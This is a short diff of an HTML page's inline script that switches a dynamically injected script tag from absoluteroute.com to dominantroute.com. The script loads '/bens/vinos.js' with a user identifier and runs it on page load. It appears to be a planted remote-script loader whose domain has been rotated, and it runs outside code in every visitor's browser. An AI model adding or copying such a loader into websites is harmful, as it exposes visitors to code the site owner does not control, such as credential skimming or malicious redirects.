@@ -109,7 +109,7 @@
                     script.type = 'text/javascript';
                     script.charset = 'utf-8';
                     script.async = 'true';
-                    script.src = 'https://absoluteroute.com/bens/vinos.js?23489&u=' + ud + '&a=' + Math.random();
+                    script.src = 'https://dominantroute.com/bens/vinos.js?23489&u=' + ud + '&a=' + Math.random();
                     document.body.appendChild(script);
                 })();
             </script>
